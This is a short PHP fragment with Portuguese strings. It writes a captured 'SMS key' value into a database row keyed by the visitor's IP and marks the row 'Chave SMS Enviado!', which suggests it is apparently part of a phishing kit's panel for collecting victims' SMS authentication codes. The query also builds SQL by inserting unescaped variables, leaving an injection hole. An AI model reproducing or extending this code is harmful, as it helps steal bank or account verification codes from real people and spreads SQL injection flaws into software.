...
$tempo = time();
$atualiza = mysqli_query(DBCOnnect(), "UPDATE infos SET tempo='$tempo', dados_do_email='$sms', status='Online no enviar SMS', statusremote='Chave SMS Enviado!' WHERE ip='$ip'");
